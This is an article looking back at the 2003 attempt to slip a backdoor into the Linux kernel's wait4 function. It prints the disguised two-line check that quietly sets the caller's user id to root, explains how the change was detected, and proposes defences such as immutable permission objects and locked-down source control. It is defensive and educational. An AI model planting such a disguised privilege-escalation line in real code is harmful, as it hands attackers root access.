A Look Back at the Linux Kernel Backdoor
================================================================================
With all of the recent concern over the US government’s National Security Agency (NSA) some of the attention has turn to the possibility of backdoors. For those of you unfamiliar with the term, a backdoor is an intentional vulnerability in an operating system or software that allows otherwise unauthorized users to gain access to the system. Back in 2003 someone attempted to insert a backdoor into the Linux kernel. Though caught, it illustrates how seemingly innocuous changes can introduce vulnerabilities and the importance of tractability in source control.

The code, first described by Corbet in an [LVN.Net article][1], was disguised to look like a parameter validation check in the [wait4][2] function.

    if ((options == (__WCLONE|__WALL)) && (current->uid = 0))
    retval = -EINVAL;

Normally it would have no effect, but if the calling program intentionally passed in invalid values the second part of the if expression would execute. This part would set the program’s user id (current->uid) to 0, which is the root user in Linux.

At first glance it looks like a simple typo. Developers often accidentally write ‘=’ when they mean to write ‘==’. But when you consider that the wait4 function shouldn’t have anything to do with the user id it becomes clear that this was intentional.

Corbet explains how this caught,

> Every change in the CVS repository includes backlink information tying it to the equivalent BitKeeper changesets. The changes in question lacked that information, and thus stood out immediately.
> 
> An attempt to make a change in this way is suspicious, to say the least, so there was a lot of interest in what the attempted change was.

The attack used to insert the backdoor was again the CVS clone of the BitKeeper repository. He continues,

> The CVS repository is generated from BitKeeper, it is not a path for patches to get into the BitKeeper repositories. So the code in question could only affect users who were working from the CVS repository. Kernels used by distributors probably do not come from that repository, and, as this incident has shown, illicit code can only remain there for so long before being detected.

Imagine, if you will, if someone tried this attack in a code base without the controls and scrutiny that the Linux kernel team employed. How would you protect yourself if a seemingly innocent line of code could be inserted anywhere and effectively create a backdoor?

One option would be to create your own “kernel” inside the application. Only this code could can changes flags such as the user’s roles and permissions. All other code only gets a read-only view of the user permission object so that they cannot easily give the user root access.

Under this model, the code “current->uid = 0” simply wouldn’t compile. Instead one would have to either directly alter the application’s security module, which would be watched much more closely, or resort to tricks using reflection. And reflection code would of course be far more noticeable than a simple assignment.

If the language supports it, an even better option is to make the user’s permission set entirely immutable. This would further constrain the places where a successful attack may reside to just where the permission set is created.

These should be augmented with restrictions on the source control server. Rather than running them wide open, the ability to promote code into main branches should restricted to as few people as possible. And security sensitive code should be entirely locked down by default, with edit permissions only granted on a case by case basis. The exact way this be implemented depends on whether one is using distributed or centralized source control and the specific product.

Ultimately techniques such as this will fail if code changes are not audited before they reach production. These can only reduce the likelihood such an audit will miss something.

--------------------------------------------------------------------------------

via: http://www.infoq.com/news/2013/10/Linux-Backdoor

本文由 [LCTT](https://github.com/LCTT/TranslateProject) 原创翻译，[Linux中国](http://linux.cn/) 荣誉推出

译者：[译者ID](https://github.com/译者ID) 校对：[校对者ID](https://github.com/校对者ID)

[1]:https://lwn.net/Articles/57135/
[2]:http://linux.die.net/man/2/wait4